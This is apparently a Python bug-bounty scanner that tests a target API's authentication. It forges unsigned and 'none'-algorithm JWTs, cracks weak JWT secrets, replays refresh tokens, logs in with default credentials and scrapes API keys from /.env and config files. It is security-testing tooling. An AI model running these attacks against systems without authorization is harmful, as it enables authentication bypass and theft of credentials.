"""
API Authentication Chain Tester Agent

Comprehensive multi-stage authentication flow analysis and token-based authentication
vulnerability detection agent. Tests API key, OAuth, JWT, HMAC, and signature-based
authentication mechanisms for security flaws.

Features:
- Multi-stage auth flow analysis
- Token refresh vulnerability testing
- API key security testing
- Signature verification bypass
- HMAC implementation testing
- Bearer token security
- State machine bypass
- Database integration for payload learning

Author: BountyHound Team
Version: 3.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import base64
import hashlib
import hmac
import json
import re
import secrets
import time
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta
from enum import Enum
import urllib.parse


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

from engine.core.database import BountyHoundDB
from engine.core.db_hooks import DatabaseHooks


class AuthVulnSeverity(Enum):
    """Authentication vulnerability severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class AuthVulnType(Enum):
    """Types of authentication vulnerabilities."""
    JWT_ALGORITHM_NONE = "JWT_ALGORITHM_NONE"
    JWT_ALGORITHM_CONFUSION = "JWT_ALGORITHM_CONFUSION"
    JWT_WEAK_SECRET = "JWT_WEAK_SECRET"
    JWT_SIGNATURE_BYPASS = "JWT_SIGNATURE_BYPASS"
    JWT_CLAIMS_MANIPULATION = "JWT_CLAIMS_MANIPULATION"
    REFRESH_TOKEN_REPLAY = "REFRESH_TOKEN_REPLAY"
    REFRESH_TOKEN_NOT_ROTATED = "REFRESH_TOKEN_NOT_ROTATED"
    TOKEN_NOT_REVOKED = "TOKEN_NOT_REVOKED"
    API_KEY_EXPOSURE = "API_KEY_EXPOSURE"
    API_KEY_PREDICTABLE = "API_KEY_PREDICTABLE"
    API_KEY_WEAK_ENTROPY = "API_KEY_WEAK_ENTROPY"
    HMAC_TIMING_ATTACK = "HMAC_TIMING_ATTACK"
    SIGNATURE_STRIPPING = "SIGNATURE_STRIPPING"
    TOKEN_IN_URL = "TOKEN_IN_URL"
    TOKEN_LEAKAGE_ERROR = "TOKEN_LEAKAGE_ERROR"
    STATE_BYPASS = "STATE_BYPASS"
    BEARER_TOKEN_EXPOSURE = "BEARER_TOKEN_EXPOSURE"


@dataclass
class AuthFinding:
    """Represents an authentication security finding."""
    title: str
    severity: AuthVulnSeverity
    vuln_type: AuthVulnType
    description: str
    endpoint: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    poc: str = ""
    impact: str = ""
    remediation: str = ""
    cwe_id: Optional[str] = None
    bounty_estimate: str = ""
    cve_refs: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary."""
        data = asdict(self)
        data['severity'] = self.severity.value
        data['vuln_type'] = self.vuln_type.value
        return data


@dataclass
class AuthTestResult:
    """Result from authentication testing."""
    target_url: str
    findings: List[AuthFinding] = field(default_factory=list)
    auth_endpoints: Dict[str, str] = field(default_factory=dict)
    auth_schemes: List[str] = field(default_factory=list)
    captured_tokens: List[Dict[str, Any]] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert result to dictionary."""
        return {
            'target_url': self.target_url,
            'findings': [f.to_dict() for f in self.findings],
            'auth_endpoints': self.auth_endpoints,
            'auth_schemes': self.auth_schemes,
            'total_findings': len(self.findings),
            'critical': len([f for f in self.findings if f.severity == AuthVulnSeverity.CRITICAL]),
            'high': len([f for f in self.findings if f.severity == AuthVulnSeverity.HIGH]),
            'medium': len([f for f in self.findings if f.severity == AuthVulnSeverity.MEDIUM]),
            'low': len([f for f in self.findings if f.severity == AuthVulnSeverity.LOW]),
            'estimated_bounty': self._calculate_total_bounty()
        }

    def _calculate_total_bounty(self) -> str:
        """Calculate total estimated bounty range."""
        total_min = 0
        total_max = 0

        for finding in self.findings:
            if finding.bounty_estimate:
                match = re.search(r'\$([0-9,]+)-\$([0-9,]+)', finding.bounty_estimate)
                if match:
                    total_min += int(match.group(1).replace(',', ''))
                    total_max += int(match.group(2).replace(',', ''))

        return f"${total_min:,}-${total_max:,}"


class APIAuthenticationChainTester:
    """
    Advanced API authentication chain and token security testing agent.

    Tests:
    - Multi-stage authentication flows
    - JWT vulnerabilities (algorithm confusion, weak secrets, signature bypass)
    - Token refresh mechanisms
    - API key security
    - HMAC implementations
    - Signature verification
    - Bearer token handling
    - State machine bypass

    Usage:
        tester = APIAuthenticationChainTester(target_url="https://api.example.com")
        result = tester.run_comprehensive_test()
    """

    # Common authentication endpoints
    COMMON_AUTH_PATHS = {
        'login': ['/api/login', '/api/auth/login', '/auth/login', '/v1/login', '/login'],
        'token': ['/api/token', '/api/auth/token', '/oauth/token', '/token'],
        'refresh': ['/api/refresh', '/api/auth/refresh', '/refresh', '/token/refresh'],
        'logout': ['/api/logout', '/api/auth/logout', '/logout'],
        'register': ['/api/register', '/api/auth/register', '/register'],
        'verify': ['/api/verify', '/api/auth/verify', '/verify']
    }

    # Common weak JWT secrets
    WEAK_SECRETS = [
        'secret', 'password', 'secret123', 'jwt_secret', 'api_key',
        'your-256-bit-secret', 'your-secret-key', 'mysecret', 'test',
        'dev', 'debug', '1234', '12345', '123456', 'admin', 'root', ''
    ]

    def __init__(self, target_url: str, timeout: int = 10, verify_ssl: bool = True,
                 use_database: bool = True):
        """
        Initialize API Authentication Chain Tester.

        Args:
            target_url: Target API URL to test
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
            use_database: Whether to use database for payload learning
        """
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library required. Install: pip install requests")

        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.use_database = use_database
        self.result = AuthTestResult(target_url=target_url)

        if self.use_database:
            self.db = BountyHoundDB()

    def run_comprehensive_test(self) -> AuthTestResult:
        """
        Execute comprehensive API authentication security testing.

        Returns:
            AuthTestResult with all findings
        """
        print("[*] Starting API Authentication Chain Assessment")
        print(f"[*] Target: {self.target_url}")

        # Database check before testing
        if self.use_database:
            context = DatabaseHooks.before_test(self.target_url, 'api_authentication_chain_tester')
            if context['should_skip']:
                print(f"[!] {context['reason']}")
                print(f"[!] Previous findings: {len(context['previous_findings'])}")
                return self.result

        # Phase 1: Discovery
        print("\n[Phase 1] Authentication Discovery")
        self._discover_auth_endpoints()
        self._identify_auth_schemes()

        # Phase 2: JWT Testing
        print("\n[Phase 2] JWT Vulnerability Testing")
        self._test_jwt_vulnerabilities()

        # Phase 3: Token Refresh
        print("\n[Phase 3] Token Refresh Flow Testing")
        self._test_token_refresh_flow()
        self._test_token_revocation()

        # Phase 4: API Key Testing
        print("\n[Phase 4] API Key Security Testing")
        self._test_api_key_exposure()

        # Phase 5: Signature Testing
        print("\n[Phase 5] Signature Verification Testing")
        self._test_hmac_implementation()

        # Phase 6: Bearer Token
        print("\n[Phase 6] Bearer Token Security Testing")
        self._test_token_leakage()

        # Record tool run in database
        if self.use_database:
            self.db.record_tool_run(
                domain=self.target_url,
                tool_name='api_authentication_chain_tester',
                findings_count=len(self.result.findings),
                success=True
            )

        print(f"\n[*] Testing complete. Found {len(self.result.findings)} issues.")
        return self.result

    def _discover_auth_endpoints(self):
        """Discover authentication-related endpoints."""
        print("  [*] Discovering authentication endpoints...")

        for endpoint_type, paths in self.COMMON_AUTH_PATHS.items():
            for path in paths:
                url = f"{self.target_url}{path}"

                try:
                    for method in ['POST', 'GET']:
                        try:
                            if method == 'POST':
                                resp = requests.post(url, json={}, timeout=self.timeout,
                                                   verify=self.verify_ssl)
                            else:
                                resp = requests.get(url, timeout=self.timeout,
                                                  verify=self.verify_ssl)

                            if resp.status_code in [200, 400, 401, 422]:
                                self.result.auth_endpoints[endpoint_type] = url
                                print(f"  [+] Found {endpoint_type} endpoint: {url}")
                                break
                        except:
                            continue
                except:
                    continue

    def _identify_auth_schemes(self):
        """Identify authentication schemes in use."""
        print("  [*] Identifying authentication schemes...")

        schemes_found = set()

        # Check WWW-Authenticate header
        try:
            resp = requests.get(f"{self.target_url}/api", timeout=self.timeout,
                              verify=self.verify_ssl)
            auth_header = resp.headers.get('WWW-Authenticate', '')

            if auth_header:
                if 'Bearer' in auth_header:
                    schemes_found.add('bearer')
                if 'Basic' in auth_header:
                    schemes_found.add('basic')
                if 'HMAC' in auth_header:
                    schemes_found.add('hmac')
        except:
            pass

        # Test common authentication methods
        test_headers = {
            'bearer': {'Authorization': 'Bearer test_token_123'},
            'api_key': {'X-API-Key': 'test_key_123'},
            'token': {'X-Auth-Token': 'test_token_123'},
            'hmac': {'X-Signature': 'test_signature'}
        }

        for scheme, headers in test_headers.items():
            try:
                resp = requests.get(f"{self.target_url}/api", headers=headers,
                                  timeout=self.timeout, verify=self.verify_ssl)

                if resp.status_code in [401, 403]:
                    schemes_found.add(scheme)
                    print(f"  [+] Detected authentication scheme: {scheme}")
            except:
                continue

        self.result.auth_schemes = list(schemes_found)

    def _test_jwt_vulnerabilities(self):
        """Test JWT-specific vulnerabilities."""
        print("  [*] Testing JWT vulnerabilities...")

        jwt_token = self._obtain_jwt_token()
        if not jwt_token:
            print("  [-] No JWT token obtained")
            return

        # Test algorithm confusion
        self._test_jwt_algorithm_confusion(jwt_token)

        # Test signature bypass
        self._test_jwt_signature_bypass(jwt_token)

        # Test weak secrets (with database integration)
        self._test_jwt_weak_secret(jwt_token)

    def _obtain_jwt_token(self) -> Optional[str]:
        """Attempt to obtain a JWT token."""
        if 'login' not in self.result.auth_endpoints:
            return None

        login_url = self.result.auth_endpoints['login']

        test_creds = [
            {'username': 'test', 'password': 'test'},
            {'email': 'test@test.com', 'password': 'test'}
        ]

        for creds in test_creds:
            try:
                resp = requests.post(login_url, json=creds, timeout=self.timeout,
                                   verify=self.verify_ssl)

                if resp.status_code == 200:
                    data = resp.json()
                    token = data.get('token') or data.get('access_token') or data.get('jwt')

                    if token and self._is_jwt(token):
                        self.result.captured_tokens.append({
                            'type': 'jwt',
                            'value': token,
                            'source': 'login'
                        })
                        return token
            except:
                continue

        return None

    def _is_jwt(self, token: str) -> bool:
        """Check if token is a JWT."""
        parts = token.split('.')
        if len(parts) != 3:
            return False

        try:
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            return 'alg' in header
        except:
            return False

    def _decode_jwt(self, token: str) -> Tuple[Optional[Dict], Optional[Dict], Optional[str]]:
        """Decode JWT without verification."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None, None, None

            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            signature = parts[2]

            return header, payload, signature
        except:
            return None, None, None

    def _test_jwt_algorithm_confusion(self, token: str):
        """Test JWT algorithm confusion attacks."""
        print("  [*] Testing JWT algorithm confusion...")

        header, payload, _ = self._decode_jwt(token)
        if not header or not payload:
            return

        algorithm = header.get('alg', '').upper()

        # Test 'none' algorithm
        none_token = self._create_jwt_with_alg(payload, header, 'none', '')

        if self._test_jwt_token(none_token):
            self.result.findings.append(AuthFinding(
                title="JWT 'none' Algorithm Accepted - Critical Authentication Bypass",
                severity=AuthVulnSeverity.CRITICAL,
                vuln_type=AuthVulnType.JWT_ALGORITHM_NONE,
                description="Server accepts JWT tokens with algorithm 'none', allowing complete signature bypass.",
                endpoint=self.target_url,
                evidence={'original_alg': algorithm, 'unsigned_token': none_token[:50] + '...'},
                impact="Attackers can forge arbitrary tokens without knowing signing key, leading to complete authentication bypass.",
                remediation="Reject tokens with algorithm 'none'. Use strict algorithm validation.",
                cwe_id='CWE-347',
                bounty_estimate='$5,000-$15,000',
                cve_refs=['CVE-2015-9235', 'CVE-2018-1000531']
            ))
            print("  [!] CRITICAL: JWT 'none' algorithm accepted!")

        # Test RS256 to HS256 confusion
        if algorithm == 'RS256':
            print("  [*] Testing RS256 to HS256 algorithm confusion...")
            self.result.findings.append(AuthFinding(
                title="Potential RS256 to HS256 Algorithm Confusion",
                severity=AuthVulnSeverity.HIGH,
                vuln_type=AuthVulnType.JWT_ALGORITHM_CONFUSION,
                description="Token uses RS256. Test if server accepts HS256 variant signed with public key.",
                endpoint=self.target_url,
                evidence={'current_algorithm': 'RS256', 'attack_algorithm': 'HS256'},
                impact="If vulnerable, attacker can sign tokens using public key as HMAC secret.",
                remediation="Explicitly verify algorithm matches expected value. Never allow algorithm switching.",
                cwe_id='CWE-327',
                bounty_estimate='$6,000-$18,000',
                cve_refs=['CVE-2016-5431']
            ))

    def _test_jwt_signature_bypass(self, token: str):
        """Test JWT signature bypass techniques."""
        print("  [*] Testing JWT signature bypass...")

        header, payload, _ = self._decode_jwt(token)
        if not header or not payload:
            return

        # Test removing signature
        parts = token.split('.')
        unsigned = f"{parts[0]}.{parts[1]}."

        if self._test_jwt_token(unsigned):
            self.result.findings.append(AuthFinding(
                title="JWT Signature Not Verified - Critical Bypass",
                severity=AuthVulnSeverity.CRITICAL,
                vuln_type=AuthVulnType.JWT_SIGNATURE_BYPASS,
                description="Server does not verify JWT signatures. Unsigned tokens are accepted.",
                endpoint=self.target_url,
                evidence={'unsigned_token': unsigned[:50] + '...'},
                impact="Complete authentication bypass. Attackers can modify token claims without detection.",
                remediation="Always validate JWT signatures before trusting token contents.",
                cwe_id='CWE-347',
                bounty_estimate='$5,000-$15,000'
            ))
            print("  [!] CRITICAL: JWT signature bypass successful!")

    def _test_jwt_weak_secret(self, token: str):
        """Test for weak JWT secrets with database integration."""
        print("  [*] Testing for weak JWT secrets...")

        header, payload, _ = self._decode_jwt(token)
        if not header or not payload:
            return

        algorithm = header.get('alg', '').upper()
        if algorithm not in ['HS256', 'HS384', 'HS512']:
            return

        parts = token.split('.')
        signing_input = f"{parts[0]}.{parts[1]}"
        signature = parts[2]

        # Try common weak secrets
        secrets_to_test = self.WEAK_SECRETS.copy()

        # Add successful payloads from database
        if self.use_database:
            db_secrets = DatabaseHooks.get_successful_payloads('JWT_WEAK_SECRET', limit=20)
            for record in db_secrets:
                secret = record.get('payload', '')
                if secret not in secrets_to_test:
                    secrets_to_test.append(secret)

        for secret in secrets_to_test:
            test_sig = self._generate_jwt_signature(signing_input, secret, algorithm)
            if test_sig == signature:
                self.result.findings.append(AuthFinding(
                    title=f'Weak JWT Secret Cracked: "{secret}"',
                    severity=AuthVulnSeverity.CRITICAL,
                    vuln_type=AuthVulnType.JWT_WEAK_SECRET,
                    description=f'JWT signing secret is weak and was cracked: "{secret}"',
                    endpoint=self.target_url,
                    evidence={'cracked_secret': secret, 'algorithm': algorithm},
                    impact="Attackers can forge arbitrary tokens and bypass authentication completely.",
                    remediation="Use cryptographically strong random secret (minimum 256 bits). Rotate immediately.",
                    cwe_id='CWE-798',
                    bounty_estimate='$5,000-$18,000'
                ))
                print(f"  [!] CRITICAL: Weak JWT secret found: {secret}")
                return

    def _create_jwt_with_alg(self, payload: Dict, header: Dict, alg: str, key: str) -> str:
        """Create JWT with specified algorithm."""
        header = header.copy()
        header['alg'] = alg

        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        if alg == 'none':
            return f"{header_b64}.{payload_b64}."

        message = f"{header_b64}.{payload_b64}"
        signature = self._generate_jwt_signature(message, key, alg)

        return f"{header_b64}.{payload_b64}.{signature}"

    def _generate_jwt_signature(self, signing_input: str, secret: str, algorithm: str) -> str:
        """Generate JWT signature."""
        hash_func = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512
        }.get(algorithm, hashlib.sha256)

        signature = hmac.new(
            secret.encode(),
            signing_input.encode(),
            hash_func
        ).digest()

        return base64.urlsafe_b64encode(signature).decode().rstrip('=')

    def _test_jwt_token(self, token: str) -> bool:
        """Test if JWT token is accepted."""
        test_endpoints = ['/api/user', '/api/profile', '/api/me', '/api/account']
        headers = {'Authorization': f'Bearer {token}'}

        for endpoint in test_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                resp = requests.get(url, headers=headers, timeout=self.timeout,
                                  verify=self.verify_ssl)

                if resp.status_code == 200:
                    return True
            except:
                continue

        return False

    def _test_token_refresh_flow(self):
        """Test token refresh flow vulnerabilities."""
        print("  [*] Testing token refresh flow...")

        if 'refresh' not in self.result.auth_endpoints:
            print("  [-] No refresh endpoint found")
            return

        refresh_url = self.result.auth_endpoints['refresh']
        access_token, refresh_token = self._obtain_token_pair()

        if not refresh_token:
            return

        # Test refresh token replay
        self._test_refresh_token_replay(refresh_url, refresh_token)

        # Test token rotation
        self._test_refresh_token_rotation(refresh_url, refresh_token)

    def _obtain_token_pair(self) -> Tuple[Optional[str], Optional[str]]:
        """Obtain access and refresh token pair."""
        if 'login' not in self.result.auth_endpoints:
            return None, None

        login_url = self.result.auth_endpoints['login']
        test_creds = {'username': 'test', 'password': 'test'}

        try:
            resp = requests.post(login_url, json=test_creds, timeout=self.timeout,
                               verify=self.verify_ssl)

            if resp.status_code == 200:
                data = resp.json()
                access_token = data.get('access_token') or data.get('token')
                refresh_token = data.get('refresh_token')
                return access_token, refresh_token
        except:
            pass

        return None, None

    def _test_refresh_token_replay(self, refresh_url: str, refresh_token: str):
        """Test refresh token replay vulnerability."""
        print("  [*] Testing refresh token replay...")

        for i in range(3):
            try:
                resp = requests.post(
                    refresh_url,
                    json={'refresh_token': refresh_token},
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                if resp.status_code == 200 and i > 0:
                    self.result.findings.append(AuthFinding(
                        title="Refresh Token Replay Vulnerability",
                        severity=AuthVulnSeverity.HIGH,
                        vuln_type=AuthVulnType.REFRESH_TOKEN_REPLAY,
                        description="Refresh tokens can be reused multiple times. Not invalidated after use.",
                        endpoint=refresh_url,
                        evidence={'replay_count': i + 1},
                        impact="Stolen refresh tokens provide persistent access even after use.",
                        remediation="Invalidate refresh token immediately after use. Implement token rotation.",
                        cwe_id='CWE-613',
                        bounty_estimate='$3,000-$8,000'
                    ))
                    print("  [!] Refresh token replay successful!")
                    break
                elif resp.status_code != 200:
                    break
            except:
                break

    def _test_refresh_token_rotation(self, refresh_url: str, refresh_token: str):
        """Test if refresh tokens are rotated."""
        print("  [*] Testing refresh token rotation...")

        try:
            resp = requests.post(
                refresh_url,
                json={'refresh_token': refresh_token},
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            if resp.status_code == 200:
                data = resp.json()
                new_refresh_token = data.get('refresh_token')

                if new_refresh_token == refresh_token:
                    self.result.findings.append(AuthFinding(
                        title="Refresh Tokens Not Rotated",
                        severity=AuthVulnSeverity.MEDIUM,
                        vuln_type=AuthVulnType.REFRESH_TOKEN_NOT_ROTATED,
                        description="Refresh tokens are not rotated after use.",
                        endpoint=refresh_url,
                        evidence={'same_token_returned': True},
                        impact="Increases risk from stolen refresh tokens.",
                        remediation="Implement refresh token rotation per OAuth 2.0 Security Best Practices.",
                        cwe_id='CWE-613',
                        bounty_estimate='$1,500-$4,000'
                    ))
        except:
            pass

    def _test_token_revocation(self):
        """Test token revocation mechanisms."""
        print("  [*] Testing token revocation...")

        if 'logout' not in self.result.auth_endpoints:
            print("  [-] No logout endpoint found")
            return

        access_token, _ = self._obtain_token_pair()
        if not access_token:
            return

        logout_url = self.result.auth_endpoints['logout']

        try:
            headers = {'Authorization': f'Bearer {access_token}'}
            resp = requests.post(logout_url, headers=headers, timeout=self.timeout,
                               verify=self.verify_ssl)

            if resp.status_code in [200, 204]:
                if self._test_jwt_token(access_token):
                    self.result.findings.append(AuthFinding(
                        title="Tokens Not Revoked After Logout",
                        severity=AuthVulnSeverity.MEDIUM,
                        vuln_type=AuthVulnType.TOKEN_NOT_REVOKED,
                        description="Access tokens remain valid after logout.",
                        endpoint=logout_url,
                        evidence={'token_still_valid': True},
                        impact="Logged out users can still access API using old tokens.",
                        remediation="Implement token revocation. Use short-lived tokens with refresh flow.",
                        cwe_id='CWE-613',
                        bounty_estimate='$2,000-$5,000'
                    ))
                    print("  [!] Token still valid after logout!")
        except:
            pass

    def _test_api_key_exposure(self):
        """Test API key exposure vectors."""
        print("  [*] Testing API key exposure...")

        exposure_points = [
            '/api/docs', '/swagger.json', '/openapi.json',
            '/.env', '/config.json', '/config.js'
        ]

        api_key_patterns = [
            r'api[_-]?key["\s:=]+["\']([a-zA-Z0-9_-]{20,})["\']',
            r'apikey["\s:=]+["\']([a-zA-Z0-9_-]{20,})["\']',
            r'x-api-key["\s:=]+["\']([a-zA-Z0-9_-]{20,})["\']'
        ]

        for path in exposure_points:
            try:
                url = f"{self.target_url}{path}"
                resp = requests.get(url, timeout=self.timeout, verify=self.verify_ssl)

                if resp.status_code == 200:
                    for pattern in api_key_patterns:
                        matches = re.findall(pattern, resp.text, re.IGNORECASE)
                        if matches:
                            self.result.findings.append(AuthFinding(
                                title="API Key Exposed in Public Endpoint",
                                severity=AuthVulnSeverity.CRITICAL,
                                vuln_type=AuthVulnType.API_KEY_EXPOSURE,
                                description=f"API keys found exposed at {url}",
                                endpoint=url,
                                evidence={'keys_found': len(matches), 'sample': matches[0][:20] + '...'},
                                impact="Exposed API keys allow unauthorized API access.",
                                remediation="Remove API keys from client-side code. Use backend proxy.",
                                cwe_id='CWE-798',
                                bounty_estimate='$4,000-$12,000'
                            ))
                            print(f"  [!] API key exposed at {url}")
                            return
            except:
                continue

    def _test_hmac_implementation(self):
        """Test HMAC implementation security."""
        print("  [*] Testing HMAC implementation...")

        self._test_hmac_timing_attack()

    def _test_hmac_timing_attack(self):
        """Test HMAC timing attack vulnerability."""
        print("  [*] Testing HMAC timing attack...")

        test_signatures = ['a' * 64, 'b' * 64, 'c' * 64]
        timing_data = []

        for sig in test_signatures:
            headers = {'X-Signature': sig}
            times = []

            for _ in range(10):
                start = time.time()
                try:
                    requests.get(f"{self.target_url}/api", headers=headers,
                               timeout=self.timeout, verify=self.verify_ssl)
                    elapsed = time.time() - start
                    times.append(elapsed)
                except:
                    pass

            if times:
                avg_time = sum(times) / len(times)
                timing_data.append({'signature': sig[:10], 'avg_time': avg_time})

        if self._has_timing_difference(timing_data):
            self.result.findings.append(AuthFinding(
                title="HMAC Verification Vulnerable to Timing Attacks",
                severity=AuthVulnSeverity.MEDIUM,
                vuln_type=AuthVulnType.HMAC_TIMING_ATTACK,
                description="HMAC comparison vulnerable to timing attacks. Response times vary based on signature.",
                endpoint=f"{self.target_url}/api",
                evidence={'timing_data': timing_data},
                impact="Attackers can gradually recover valid HMAC signatures byte-by-byte.",
                remediation="Use constant-time comparison for HMAC validation (e.g., hmac.compare_digest).",
                cwe_id='CWE-208',
                bounty_estimate='$2,000-$6,000'
            ))
            print("  [!] HMAC timing attack vulnerability detected!")

    def _has_timing_difference(self, timing_data: List[Dict]) -> bool:
        """Check for statistically significant timing differences."""
        if len(timing_data) < 2:
            return False

        times = [d['avg_time'] for d in timing_data]
        mean = sum(times) / len(times)
        variance = sum((t - mean) ** 2 for t in times) / len(times)
        std_dev = variance ** 0.5

        return std_dev > mean * 0.1

    def _test_token_leakage(self):
        """Test token leakage vectors."""
        print("  [*] Testing token leakage...")

        self._test_token_in_url()
        self._test_token_in_errors()

    def _test_token_in_url(self):
        """Test if tokens are accepted in URLs."""
        test_endpoints = ['/api/user', '/api/profile']

        for endpoint in test_endpoints:
            token = 'test_token_123'
            url = f"{self.target_url}{endpoint}?token={token}&access_token={token}"

            try:
                resp = requests.get(url, timeout=self.timeout, verify=self.verify_ssl)

                if resp.status_code == 401:
                    error = resp.text.lower()
                    if 'token' in error or 'invalid' in error:
                        self.result.findings.append(AuthFinding(
                            title="Authentication Tokens Accepted in URL Parameters",
                            severity=AuthVulnSeverity.MEDIUM,
                            vuln_type=AuthVulnType.TOKEN_IN_URL,
                            description="API accepts authentication tokens as URL parameters.",
                            endpoint=url,
                            evidence={'parameter': 'token'},
                            impact="Tokens leak via browser history, server logs, and referrer headers.",
                            remediation="Only accept tokens in Authorization header. Reject URL-based tokens.",
                            cwe_id='CWE-598',
                            bounty_estimate='$1,500-$4,000'
                        ))
                        print("  [!] Tokens accepted in URL!")
                        return
            except:
                continue

    def _test_token_in_errors(self):
        """Test if tokens appear in error messages."""
        token = 'test_secret_token_12345'
        headers = {'Authorization': f'Bearer {token}'}

        try:
            resp = requests.get(f"{self.target_url}/api/invalid", headers=headers,
                              timeout=self.timeout, verify=self.verify_ssl)

            if token in resp.text:
                self.result.findings.append(AuthFinding(
                    title="Authentication Tokens Leak in Error Messages",
                    severity=AuthVulnSeverity.MEDIUM,
                    vuln_type=AuthVulnType.TOKEN_LEAKAGE_ERROR,
                    description="Authentication tokens are reflected in error messages.",
                    endpoint=f"{self.target_url}/api/invalid",
                    evidence={'token_in_response': True},
                    impact="Tokens can leak via error pages and logs.",
                    remediation="Sanitize error messages. Never reflect sensitive tokens.",
                    cwe_id='CWE-209',
                    bounty_estimate='$1,000-$3,000'
                ))
                print("  [!] Token leaks in error messages!")
        except:
            pass


# Integration with BountyHound
def execute_api_auth_test(target: str, config: Optional[Dict] = None) -> Dict:
    """
    Execute API authentication security testing.

    Args:
        target: Target URL to test
        config: Optional configuration dictionary

    Returns:
        Dictionary with test results and findings
    """
    config = config or {}
    timeout = config.get('timeout', 10)
    verify_ssl = config.get('verify_ssl', True)
    use_database = config.get('use_database', True)

    tester = APIAuthenticationChainTester(
        target_url=target,
        timeout=timeout,
        verify_ssl=verify_ssl,
        use_database=use_database
    )

    result = tester.run_comprehensive_test()
    return result.to_dict()


if __name__ == '__main__':
    import sys

    if len(sys.argv) < 2:
        print("Usage: python api_authentication_chain_tester.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    result = execute_api_auth_test(target)

    print("\n" + "="*80)
    print("API AUTHENTICATION CHAIN TEST RESULTS")
    print("="*80)
    print(f"Target: {result['target_url']}")
    print(f"Total Findings: {result['total_findings']}")
    print(f"  Critical: {result['critical']}")
    print(f"  High: {result['high']}")
    print(f"  Medium: {result['medium']}")
    print(f"  Low: {result['low']}")
    print(f"Estimated Bounty: {result['estimated_bounty']}")
    print("="*80)

    if result['findings']:
        print("\nFINDINGS:")
        for i, finding in enumerate(result['findings'], 1):
            print(f"\n{i}. {finding['title']}")
            print(f"   Severity: {finding['severity']}")
            print(f"   Type: {finding['vuln_type']}")
            print(f"   Bounty: {finding.get('bounty_estimate', 'N/A')}")
